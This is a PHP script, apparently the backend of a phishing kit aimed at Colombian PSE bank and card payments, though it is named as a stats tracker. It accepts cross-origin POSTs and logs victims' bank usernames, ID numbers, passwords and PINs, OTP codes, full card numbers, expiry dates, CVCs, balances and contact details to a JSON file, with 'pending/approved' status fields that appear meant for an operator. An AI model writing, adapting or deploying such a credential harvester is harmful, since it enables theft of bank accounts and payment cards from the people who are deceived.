<?php
/**
 * track_stats.php - Guarda datos de PSE y TARJETAS en pse_logs.json
 * CORREGIDO - Mejor detección de campos para todos los bancos
 */

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Solo POST']);
    exit;
}

// Crear carpeta data
$dataDir = __DIR__ . '/data';
if (!is_dir($dataDir)) {
    @mkdir($dataDir, 0777, true);
}

// ======================== RECIBIR DATOS ========================
$rawData = $_POST;

// ======================== BANCO ========================
$banco = '';
$camposBanco = ['banco', 'banco_seleccionado', 'banco_nombre', 'banco_pse'];
foreach ($camposBanco as $campo) {
    if (!empty($rawData[$campo])) {
        $banco = sanitizar($rawData[$campo]);
        break;
    }
}

// ======================== ACTIVITY ========================
$activity = sanitizar($rawData['activity'] ?? $rawData['accion'] ?? '');

// ======================== USUARIO/DOCUMENTO - MEJORADO ========================
$usuario = '';
$identificacion = '';
$documento = '';
$titular = '';

// Lista completa de campos posibles
$camposUsuario = ['usuario', 'documento', 'identificacion', 'cedula', 'numero_documento', 'doc', 'user', 'username', 'nombre', 'nombre_completo', 'cliente', 'propietario', 'titular'];
$camposIdentificacion = ['identificacion', 'documento', 'cedula', 'numero_documento', 'doc', 'id_usuario', 'documento_pse'];

// Buscar usuario
foreach ($camposUsuario as $campo) {
    if (!empty($rawData[$campo])) {
        $usuario = sanitizar($rawData[$campo]);
        break;
    }
}

// Buscar identificación
foreach ($camposIdentificacion as $campo) {
    if (!empty($rawData[$campo])) {
        $identificacion = sanitizar($rawData[$campo]);
        break;
    }
}

// Si documento está vacío pero hay identificación, usar identificación
if (empty($documento) && !empty($identificacion)) {
    $documento = $identificacion;
}

// Si todo está vacío, intentar con titular
if (empty($usuario) && !empty($rawData['titular'])) {
    $usuario = sanitizar($rawData['titular']);
}
if (empty($identificacion) && !empty($rawData['documento_pse'])) {
    $identificacion = sanitizar($rawData['documento_pse']);
    $documento = $identificacion;
}

// ======================== CLAVES ========================
$clave_pin = '';
$camposClave = ['clave_pin', 'clave', 'pin', 'password', 'clave_acceso'];
foreach ($camposClave as $campo) {
    if (!empty($rawData[$campo])) {
        $clave_pin = sanitizar($rawData[$campo]);
        break;
    }
}

$clave_tarjeta = sanitizar($rawData['clave_tarjeta'] ?? $rawData['clave_tarjeta_credito'] ?? '');

// ======================== OTP ========================
$codigo_otp = '';
$camposOtp = ['codigo_otp', 'codigo_dinamica', 'otp', 'codigo', 'codigo_verificacion', 'token'];
foreach ($camposOtp as $campo) {
    if (!empty($rawData[$campo])) {
        $codigo_otp = sanitizar($rawData[$campo]);
        break;
    }
}

// ======================== OTROS CAMPOS ========================
$ultimos_digitos = sanitizar($rawData['ultimos_digitos'] ?? $rawData['digitos'] ?? '');
$saldo = sanitizar($rawData['saldo'] ?? $rawData['saldo_cuenta'] ?? '');
$metodo = sanitizar($rawData['metodo'] ?? $rawData['tipo_transaccion'] ?? '');
$tipo_identificacion = sanitizar($rawData['tipo_identificacion'] ?? $rawData['tipo_doc'] ?? '');

// ====== CAMPOS PARA TARJETAS ======
$tipo_tarjeta = sanitizar($rawData['tipo_tarjeta'] ?? $rawData['tipo'] ?? '');
$numero_tarjeta = sanitizar($rawData['numero_tarjeta'] ?? $rawData['tarjeta'] ?? $rawData['card_number'] ?? '');
$vencimiento = sanitizar($rawData['vencimiento'] ?? $rawData['fecha_vencimiento'] ?? $rawData['expiry'] ?? '');
$cvc = sanitizar($rawData['cvc'] ?? $rawData['cvv'] ?? $rawData['codigo_seguridad'] ?? '');
$cuotas = sanitizar($rawData['cuotas'] ?? $rawData['numero_cuotas'] ?? '');
$email = sanitizar($rawData['email'] ?? $rawData['correo'] ?? '');
$celular = sanitizar($rawData['celular'] ?? $rawData['telefono'] ?? $rawData['movil'] ?? '');
$monto = sanitizar($rawData['monto'] ?? $rawData['valor'] ?? $rawData['cantidad'] ?? '');

// ======================== GUARDAR ========================
$logsFile = $dataDir . '/pse_logs.json';

$logs = [];
if (file_exists($logsFile)) {
    $content = file_get_contents($logsFile);
    $logs = json_decode($content, true) ?? [];
}

$newLog = [
    'id' => uniqid('PSE_'),
    'fecha' => date('Y-m-d H:i:s'),
    'activity' => $activity,
    'action' => sanitizar($rawData['action'] ?? ''),
    'banco' => $banco,
    'metodo' => $metodo,
    
    // ====== DATOS DEL USUARIO ======
    'usuario' => $usuario,
    'identificacion' => $identificacion,
    'documento' => $documento,
    'tipo_identificacion' => $tipo_identificacion,
    'titular' => $titular,
    
    // ====== CLAVES ======
    'clave_pin' => $clave_pin,
    'clave_tarjeta' => $clave_tarjeta,
    'ultimos_digitos' => $ultimos_digitos,
    'codigo_otp' => $codigo_otp,
    'codigo_dinamica' => $codigo_otp,
    
    // ====== SALDO ======
    'saldo' => $saldo,
    
    // ====== CAMPOS DE TARJETA ======
    'tipo_tarjeta' => $tipo_tarjeta,
    'numero_tarjeta' => $numero_tarjeta,
    'vencimiento' => $vencimiento,
    'cvc' => $cvc,
    'cuotas' => $cuotas,
    'email' => $email,
    'celular' => $celular,
    'monto' => $monto,
    
    // ====== METADATOS ======
    'estado' => 'pendiente',
    'ip' => $_SERVER['REMOTE_ADDR'] ?? '',
    'user_agent' => substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 255),
    'aprobado' => null,
    'aprobado_en' => null,
    'error_tipo' => null,
    'raw_data' => $rawData // Para depuración
];

$logs[] = $newLog;

// Guardar
try {
    $json = json_encode($logs, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    if (file_put_contents($logsFile, $json, LOCK_EX) === false) {
        throw new Exception('No se pudo escribir en ' . $logsFile);
    }
    
    http_response_code(200);
    echo json_encode([
        'success' => true,
        'id' => $newLog['id'],
        'debug' => [
            'usuario' => $usuario,
            'identificacion' => $identificacion,
            'documento' => $documento,
            'banco' => $banco
        ]
    ]);
    
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => $e->getMessage()
    ]);
}

exit;

function sanitizar($dato) {
    if (!is_string($dato)) return $dato;
    return htmlspecialchars(trim($dato), ENT_QUOTES, 'UTF-8');
}
?>
